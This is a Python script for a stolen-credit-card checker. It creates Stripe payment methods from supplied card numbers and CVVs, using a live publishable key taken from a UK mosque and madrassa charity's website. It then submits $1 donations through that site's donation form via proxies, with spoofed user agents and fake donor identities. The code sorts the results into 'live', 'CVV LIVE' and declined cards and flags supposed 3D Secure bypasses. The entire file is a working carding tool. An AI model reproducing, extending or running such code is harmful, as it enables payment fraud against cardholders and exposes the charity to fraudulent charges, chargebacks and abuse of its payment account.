import requests
import random
import json
import time
from config import *
from utils import load_config, generate_identifier

def vbv_check(card, cc_no, month, year, cvv):
    """Enhanced VBV/3D Secure check"""
    config = load_config()
    user_agent = random.choice(USER_AGENTS)
    
    # VBV check endpoints
    vbv_endpoints = [
        "https://api.stripe.com/v1/setup_intents",
        "https://api.stripe.com/v1/payment_intents",
    ]
    
    proxies = None
    if config.get('proxy_host'):
        if config.get('proxy_username'):
            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
        else:
            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
        proxies = {'http': proxy_url, 'https': proxy_url}
    
    for endpoint in vbv_endpoints:
        try:
            # Create payment method first
            pm_data = {
                'type': 'card',
                'card': {
                    'number': cc_no,
                    'exp_month': month,
                    'exp_year': year,
                    'cvc': cvv
                }
            }
            
            pm_response = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_data,
                headers={'User-Agent': user_agent},
                proxies=proxies,
                timeout=15
            )
            
            if pm_response.status_code == 200:
                pm_data = pm_response.json()
                if 'id' in pm_data:
                    # Try to create setup intent for VBV check
                    si_data = {
                        'payment_method': pm_data['id'],
                        'payment_method_types[]': 'card',
                        'usage': 'off_session'
                    }
                    
                    si_response = requests.post(
                        "https://api.stripe.com/v1/setup_intents",
                        data=si_data,
                        headers={'User-Agent': user_agent},
                        proxies=proxies,
                        timeout=15
                    )
                    
                    if si_response.status_code == 200:
                        si_data = si_response.json()
                        
                        # Analyze response for VBV indicators
                        if si_data.get('status') == 'requires_action':
                            return {
                                'vbv_status': 'VBV_REQUIRED',
                                'message': '3D Secure Authentication Required',
                                'next_action': si_data.get('next_action', {})
                            }
                        elif si_data.get('status') == 'succeeded':
                            return {
                                'vbv_status': 'VBV_BYPASSED',
                                'message': 'VBV Check Bypassed',
                                'setup_intent': si_data['id']
                            }
                        else:
                            return {
                                'vbv_status': 'VBV_UNKNOWN',
                                'message': 'VBV Status Unknown',
                                'status': si_data.get('status', 'unknown')
                            }
            
        except Exception as e:
            continue
    
    return {
        'vbv_status': 'VBV_ERROR',
        'message': 'VBV Check Failed'
    }

def payment(card, cc_no, month, year, cvv):
    config = load_config()
    user_agent = random.choice(USER_AGENTS)
    
    if (len(year) == 2 and int(year) < 24) or (len(year) != 2 and int(year) < 2024):
        return [False, "Expired Card"]
    
    # Perform VBV check first
    vbv_result = vbv_check(card, cc_no, month, year, cvv)
    
    data = {
        'type': 'card',
        'card': {
            'number': cc_no,
            'cvc': cvv,
            'exp_month': month,
            'exp_year': year
        },
        'guid': generate_identifier('guid'),
        'muid': generate_identifier('muid'),
        'sid': generate_identifier('sid'),
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/d182db0e09; stripe-js-v3/d182db0e09; card-element',
        'referrer': 'https://masjidmadrassafaizulquran.co.uk',
        'time_on_page': 200441,
        'key': 'pk_live_51OfjhRJwKVEuci98tEMm7WUNDSX0HSQrQ6p2arFSBdc08L76O7sCYfb1K01V94OjQwVz5EIT1Ufg79uaVVn5Ljta00Xp8wxYrF'
    }
    
    proxies = None
    if config.get('proxy_host'):
        if config.get('proxy_username'):
            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
        else:
            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
        proxies = {'http': proxy_url, 'https': proxy_url}
    
    try:
        response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=data,
            headers={'User-Agent': user_agent},
            proxies=proxies,
            timeout=30
        )
        
        response_data = response.json()
        if 'id' in response_data:
            return [True, response_data['id'], vbv_result]
        else:
            return [False, "Invalid Payment Method", vbv_result]
            
    except Exception as e:
        return [False, f"Request Error: {str(e)}", vbv_result]

def enhanced_donate(card, payment_id, name, email, vbv_result=None):
    config = load_config()
    user_agent = random.choice(USER_AGENTS)
    
    form_data = f"data=__fluent_form_embded_post_id%3D572%26_fluentform_3_fluentformnonce%3Dbcd36fbd50%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3D{name}%26names%255Blast_name%255D%3D{name}%26email%3D{email}%26payment_input%3DOther%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{payment_id}&action=fluentform_submit&form_id=3"
    
    proxies = None
    if config.get('proxy_host'):
        if config.get('proxy_username'):
            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
        else:
            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
        proxies = {'http': proxy_url, 'https': proxy_url}
    
    try:
        response = requests.post(
            'https://masjidmadrassafaizulquran.co.uk/wp-admin/admin-ajax.php',
            data=form_data,
            headers={
                'Referer': 'https://masjidmadrassafaizulquran.co.uk/donate/',
                'User-Agent': user_agent,
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            proxies=proxies,
            timeout=30
        )
        
        response_data = response.json()
        
        # Determine VBV status for response
        vbv_status = "VBV - "
        if vbv_result and vbv_result.get('vbv_status') == 'VBV_REQUIRED':
            vbv_status += "3D Secure Required"
        elif vbv_result and vbv_result.get('vbv_status') == 'VBV_BYPASSED':
            vbv_status += "Bypassed"
        else:
            vbv_status += "Checked"
        
        if 'errors' in response_data:
            error_msg = response_data['errors']
            
            if 'insufficient funds' in error_msg.lower():
                return [True, "ccn", "Insufficient funds", "You Balance Is Lower Than $1.00", "($1.00)", vbv_status]
            elif 'security code' in error_msg.lower() or 'cvv' in error_msg.lower():
                return [True, "ccn", "CCN", "Security Code Is Wrong for $1.00", "($1.00)", vbv_status]
            elif 'purchase' in error_msg.lower() or 'type' in error_msg.lower():
                return [True, "ccn", "CVV", "You Can't Purchase This Type for $1.00", "($1.00)", vbv_status]
            elif 'declined' in error_msg.lower():
                return [False, "declined", "Card Declined", "Your card was declined for $1.00", "($1.00)", vbv_status]
            else:
                return [False, "failed", error_msg, f"{error_msg} for $1.00", "($1.00)", vbv_status]
                
        elif response_data.get('success'):
            message = response_data.get('data', {}).get('message', '')
            if 'Verifying strong customer authentication' in message:
                return [True, "live", "CVV LIVE", "3D Secure Required for $1.00", "($1.00)", "VBV - 3D Secure Required"]
            else:
                return [True, "live", "Approved", "Approved $1.00", "($1.00)", vbv_status]
                
        return [False, "unknown", "Unknown error", "Unknown error for $1.00", "($1.00)", vbv_status]
        
    except Exception as e:
        return [False, "error", f"Proxy Error: {str(e)}", f"Proxy Error for $1.00", "($1.00)", "VBV - Error"]

def random_user_info():
    try:
        response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
        data = response.json()
        
        if data and 'results' in data and data['results']:
            result = data['results'][0]
            first_name = result['name']['first']
            email = result['email']
            
            email_domains = ["@gmail.com", "@outlook.com", "@hotmail.com"]
            random_domain = random.choice(email_domains)
            modified_email = email.split('@')[0] + random_domain
            
            return [True, first_name, modified_email]
            
    except Exception as e:
        print(f"Random user error: {e}")
    
    return [False, "Random Generation Failed"]
